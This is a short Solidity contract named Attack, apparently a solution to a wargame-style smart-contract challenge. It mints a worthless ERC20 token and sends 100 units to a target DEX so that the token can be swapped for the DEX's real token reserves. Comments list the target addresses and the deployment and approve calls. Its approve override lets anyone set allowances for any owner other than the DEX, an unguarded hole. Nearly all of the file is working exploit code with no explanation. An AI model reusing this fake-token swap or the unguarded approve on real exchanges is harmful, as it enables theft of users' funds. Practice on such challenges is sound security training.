// SPDX-License-Identifier: UNLICENSED
pragma solidity "0.8.19";

import {ERC20} from "node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol";

// token1: 0xdDD5AD66ee14f8a99b7c661b4dC831eF556588D3
// token2: 0x4CDfa3E01c2274bAe068fE812bb18e292b93Fb1C
// dex contract: 0x68523e078B647dD41aA45D6F40F0d632F2A4Ac83

// creates a new token and send 100 tokens to the dex contract and the rest to attack
contract Attack is ERC20 {
    address private _dex;

    constructor(
        address dexInstance,
        string memory name,
        string memory symbol,
        uint256 initialSupply
    ) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply - 100);
        _mint(dexInstance, 100);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}

// Attack(0xb73303b339346b7B220e239856757eDF5e8Dd918, Renzo, RZO, 1000000)
// approve(player, dexAddr, 1000000)
